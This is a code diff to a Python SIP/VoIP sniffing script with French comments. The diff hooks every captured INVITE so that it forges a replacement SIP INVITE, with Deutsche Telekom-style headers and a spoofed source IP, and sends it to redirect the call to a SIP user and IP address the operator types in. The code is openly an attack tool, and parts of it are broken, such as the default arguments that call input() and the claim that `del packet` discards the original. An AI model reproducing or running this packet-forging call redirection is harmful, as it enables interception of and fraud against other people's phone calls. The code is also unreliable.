@@ -62,7 +62,28 @@ class Packet:
         if not SIP2:SIP2=None if not self.SIP1 else self.sip['sip.to.user']
         if a:fs=a
         del a
+def redirect(new_sip=input('Nouveau SIP : '), new_ip=input('Nouvelle adresse IP : ')):
 
+    ip_src = p['IP'].src
+    forged_packet =(
+        f'INVITE sip:{new_sip}@{new_ip};user=phone;uniq=E04784589605A88765A939C2CA2A7 SIP/2.0\r\n'
+        'Max-Forwards: 59\r\n'
+        f'Via: SIP/2.0/UDP {ip_src}:5060;branch=z9hG4bKg3Zqkv7i1tg6jule4zo2e7ndqkj1zfut6\r\n'
+        f'To: "{new_sip}" <sip:{new_sip}@telekom.de;transport=udp;user=phone>\r\n'
+        f'From: <sip:{SIP1}@dtag-gn.de;transport=udp;user=phone>;tag=h7g4Esbg_p65557t1573829978m943109c168405915s1_3637842016-655695229\r\n'
+        f'Call-ID: {CID}\r\n'
+        'CSeq: 1 INVITE\r\n'
+        f'Contact: <sip:sgc_c@{ip_src};transport=udp>;+g.3gpp.icsi-ref="urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel"\r\n'
+
+        f'a=rtpmap:101 telephone-event/{fs}\r\n'
+        ).format(new_ip)
+
+    ip = IP(src=ip_src,dst=new_ip)
+
+    udp = UDP(sport = randrange(80,65535),dport=6789)
+
+    send(ip/udp/forged_packet)
+    
 print('''
 Created by Breee and Spectra
 21/06/2022
@@ -93,6 +114,7 @@ format='%d/%m/%Y %H:%M:%S'
 start=datetime.now().strftime(format)
 for packet in capture.sniff_continuously():
     p=Packet(packet)
+    
     if p.ip!='192.168.0.100':
         #print(vars(p))
         print(p.desc,end='')
@@ -102,6 +124,11 @@ for packet in capture.sniff_continuously():
                 started=True
                 print(' '*m+('{:█^'+str(sizex-m*2)+'}').format(' CALL STARTED '))
     if p.method=='BYE':break
+    if p.method =='INVITE':
+            del packet
+            #on veut jeter le paquer INVITE original et envoyer le paquet INVITE forgé à la place
+            redirect()
+
 end=datetime.now().strftime(format)
 # PileAssignment['blabla']=Pile('ip')
 # PileAssignment['blabla'].list=['ok']
@@ -136,29 +163,3 @@ if item.endswith(".g711u") or len(item.split('.'))==5:remove(item)
 
 with open('infos_call.txt', 'w') as f:
     f.write("Date de début : {: >}\nDate de fin :   {: >}\nCall ID :       {}".format(start,end,CID))
-
-
-def redirect(new_sip=input('Nouveau SIP : '), new_ip=input('Nouvelle adresse IP : ')):
-
-    forged_packet =(
-        f'INVITE sip:{new_sip}@{new_ip};user=phone;uniq=E04784589605A88765A939C2CA2A7 SIP/2.0\r\n'
-        'Max-Forwards: 59\r\n'
-        f'Via: SIP/2.0/UDP {p['IP'].src}:5060;branch=z9hG4bKg3Zqkv7i1tg6jule4zo2e7ndqkj1zfut6\r\n'
-        f'To: "{new_sip}" <sip:{new_sip}@telekom.de;transport=udp;user=phone>\r\n'
-        f'From: <sip:{SIP1}@dtag-gn.de;transport=udp;user=phone>;tag=h7g4Esbg_p65557t1573829978m943109c168405915s1_3637842016-655695229\r\n'
-        f'Call-ID: {CID}\r\n'
-        'CSeq: 1 INVITE\r\n'
-        f'Contact: <sip:sgc_c@{p['IP'].src};transport=udp>;+g.3gpp.icsi-ref="urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel"\r\n'
-
-        f'a=rtpmap:101 telephone-event/{fs}\r\n'
-        ).format(new_ip)
-
-    ip = IP(src=p['IP'].src,dst=new_ip)
-
-    udp = UDP(sport = randrange(80,65535),dport=6789)
-
-    send(ip/udp/forged_packet)
-
-if p.method =='INVITE':
-    #on veut jeter le paquer INVITE original et envoyer le paquet INVITE forgé à la place
-    redirect()
